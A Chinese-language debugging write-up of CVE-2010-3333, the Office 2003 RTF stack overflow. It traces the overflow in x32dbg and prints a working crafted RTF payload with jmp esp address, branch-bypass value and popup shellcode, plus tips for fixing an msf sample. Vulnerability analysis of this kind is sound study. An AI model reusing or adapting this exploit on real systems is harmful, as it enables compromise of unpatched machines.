作者：黑蛋

一、漏洞简介

cve-2010-3333是一个Office 2003
的栈溢出漏洞，其原因是在文档中读取一个属性值的时候，没有对其长度验证，导致了一个溢出，看着很简单的一个漏洞，却又有点恶心人。

# 二、漏洞环境

系统

|

调试工具

|

目标程序

|

16进制编辑器  
  
---|---|---|---  
  
XP SP3

|

x32dbg

|

Microsoft Office 2003

|

010Editor  
  
# 三、漏洞分析

首先用msf获取样本：  

![](https://image.3001.net/images/20221221/1671552525_63a1de0dee94608b682db.png!small)

把我们的样本拖到XP SP3中，用x32dbg附加office 2003，打开样本：  

![](https://image.3001.net/images/20221221/1671552526_63a1de0ed0667502d0546.png!small)

卡在了这里，这是一个字符串拷贝，ESI指向的值拷贝到EDI指向的位置：

![](https://image.3001.net/images/20221221/1671552528_63a1de10342d61247b9f4.png!small)

  
我们在这句前面下断点，重新用office 2003打开样本：

![](https://image.3001.net/images/20221221/1671552529_63a1de114e9e57be44ffc.png!small)

  
卡在了我们断点处：

![](https://image.3001.net/images/20221221/1671552530_63a1de1267b560cd051b1.png!small)

  
在这里我们首先可以获取到拷贝长度的值，ECX的值，是：C8AC，我们查看esi的值：

![](https://image.3001.net/images/20221221/1671552531_63a1de132cc056ad1fd6e.png!small)

  
F8运行俩步，走过rep movsd，我们再查看堆栈：

![](https://image.3001.net/images/20221221/1671552531_63a1de13b969b95523598.png!small)

  
可以看到，ESI地址指向的值已经拷贝到了栈中EBP-10的位置向下。而返回地址在EBP+4的位置，我们已经可以确定淹没返回值的位置了。我们继续F8，但是发现程序跑飞，并没有按照正常流程发展，经过思考，应该是拷贝字符串过长，访问l无法访问的地址，导致异常，所以我们需要减少字符串拷贝长度，也就是异常代码上一句的ECX的值C8AC，直接用010Editor查看样本，很容易发现C8AC：

![](https://image.3001.net/images/20221221/1671552532_63a1de148861e8c6ffb38.png!small)

  
我们修改为1000，已经够我们用了，试试还会不会异常：

![](https://image.3001.net/images/20221221/1671552533_63a1de15361f051129c2f.png!small)

  
重新附加office2003并打开样本，ECX的值已经变成01000，并且可以不触发异常，正常走下去：

![](https://image.3001.net/images/20221221/1671552533_63a1de15cb98e71993cf5.png!small)

随后我们会发现，并没有出现弹栈返回的情况，观察这段溢出函数：

![](https://image.3001.net/images/20221221/1671552534_63a1de169ea71bc4c59ca.png!small)

  
他并没有开辟新的栈，这里算是这个漏洞第一个恶心点，我们需要继续F8向下运行，直到这个函数返回，也就是执行完拷贝代码下面的第一个ret：

![](https://image.3001.net/images/20221221/1671552535_63a1de172e9ef8cdc3250.png!small)

  
箭头指向的call就是关键call，他没有开辟栈空间，所以还需要向下执行:

![](https://image.3001.net/images/20221221/1671552536_63a1de181305f12df1394.png!small)

  
F8走过接下来一个call，到了这里：

![](https://image.3001.net/images/20221221/1671552536_63a1de18af22a1681dd8f.png!small)

  
一直跟，直到返回到EBP+4的地址，结果一直到一个循环里面来回跑（第二个恶心点），我们重新加载，进入前面F8略过得call，下面断点那里：

![](https://image.3001.net/images/20221221/1671552537_63a1de1966870f2b62578.png!small)

  
进来了，继续调试：

![](https://image.3001.net/images/20221221/1671552538_63a1de1a9442d9cdb31d6.png!small)

  
结果发现还是进入了之前那个循环，所以继续重新调试，回到第二个call里面，发现里面有个call很关键，导致函数无法返回，进入一个循环：

![](https://image.3001.net/images/20221221/1671552539_63a1de1b8eca9d7d8fab0.png!small)

我们在je这里修改标志位，跳过这个循环call：

![](https://image.3001.net/images/20221221/1671552540_63a1de1c53303beeb0203.png!small)

然后一直F8，直到一个ret 14：

![](https://image.3001.net/images/20221221/1671552541_63a1de1d289802c753233.png!small)

我们观察堆栈，这里就是我们想要的返回，只要淹没EBP+4的返回值，在这个ret我们就可以跳到shellcode，接下来我们需要观察如何让之前那个je跳转，而不是手动修改标志位，再次加载，回到第二个call（淹没代码ret后第一个call）：

![](https://image.3001.net/images/20221221/1671552542_63a1de1e075908304f80e.png!small)

发现这里EBP+10的值如果是0，就可以进行跳转，经过观察调试，发现这个值来自我们淹没返回值的payload中的某一个位置，所以接下来我们构造我们的payload，直接修改msf生成的样本（注意：所有字母必须全部换成小写)：

{\rtf1{\shp{\sp{\sn pFragments}{\sv
7;7;11111111001090909090909090900000000090909090909090901245fa7f9090909090909090909090909090909000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db53686666666668666666668bc453505053ff57fc53ff57f8909090900000}}}}

![](https://image.3001.net/images/20221221/1671552542_63a1de1eb39c3f96975b3.png!small)

  
标记1处：这里是拷贝长度，不要太大，会造成异常；  
标记2处：这里是跳板jmp esp的地址；  
标记3处：这里是00000000，用来让je跳转，不要进入循环call；  
标记4处：这里就是弹窗shellcode起始位置；  
shellcode如下：

FC686A0A381E686389D14F683274910C8BF48D7EF433DBB7042BE366BB33325368757365725433D2648B5A308B4B0C8B491C8B098B6908AD3D6A0A381E750595FF57F895608B453C8B4C057803CD8B592003DD33FF478B34BB03F5990FBE063AC47408C1CA0703D046EBF13B54241C75E48B592403DD668B3C7B8B591C03DD032CBB955FAB57613D6A0A381E75A933DB53686666666668666666668BC453505053FF57FC53FF57F8

接下来用x32dbg附加office2003，打开我们的payload看看情况：

![](https://image.3001.net/images/20221221/1671552543_63a1de1f7fad9db87308e.png!small)

  
拷贝成功，jmp esp地址成功淹没返回值，接下来观察je那里是否成功：

![](https://image.3001.net/images/20221221/1671552544_63a1de205313c1d91fe8c.png!small)

  
继续执行，到ret 14后：

![](https://image.3001.net/images/20221221/1671552545_63a1de21434972d854e92.png!small)

  
成功到了jmp esp处，而esp指向我们的shellcode位置，继续执行,到我们弹窗代码：

![](https://image.3001.net/images/20221221/1671552546_63a1de224ca97f444e03b.png!small)

  
F9运行，弹窗成功：

![](https://image.3001.net/images/20221221/1671552546_63a1de22f03faef5cd4f4.png!small)

  
在这里补充一下最后一个恶心点，也是需要注意的地方，就是在构造payload时候，无论是跳板地址，或者我们的弹窗shellcode，都要把所有大写改成小写，否则加载到程序，会识别成其他东西，比如把跳板地址大写：

![](https://image.3001.net/images/20221221/1671552548_63a1de242503a5fa02f8c.png!small)

  
用office打开并到拷贝代码之前：

![](https://image.3001.net/images/20221221/1671552548_63a1de2497b8d4b607d94.png!small)​

  
这里7FFA4512已经被识别成70004512。后面的弹窗shellcode也是一样。

